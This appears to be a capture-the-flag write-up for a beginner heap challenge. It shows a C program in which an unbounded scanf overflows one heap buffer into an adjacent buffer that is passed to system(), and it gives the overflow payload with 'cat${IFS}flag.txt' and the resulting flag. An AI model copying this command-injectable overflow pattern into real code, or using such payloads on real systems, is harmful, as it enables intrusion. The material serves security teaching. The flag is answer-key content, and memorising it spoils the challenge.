# heap0

Both a binary and a C source file were given.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	char* username = malloc(50);
	char* shell = malloc(50);
	
	printf("username at %p\n", username);
	printf("shell at %p\n", shell);
	
	strcpy(shell, "/bin/ls");
	
	printf("Enter username: ");
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
	
	return 0;
}
```
We run the program first.

```
username at 0x57606008
shell at 0x57606040
Enter username: i_like_cookies
Hello, i_like_cookies. Your shell is /bin/ls.
flag.txt
heap0
^C
```
It can be seen that two strings, username and shell, have been dynamically allocated on the heap. Their memory addresses were printed out, showing that their locations in memory are adjacent to each other.

**Solution**
```
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt
```

**Flag**
```
flag{heap_challenges_are_not_as_scary_as_most_people_think}
```
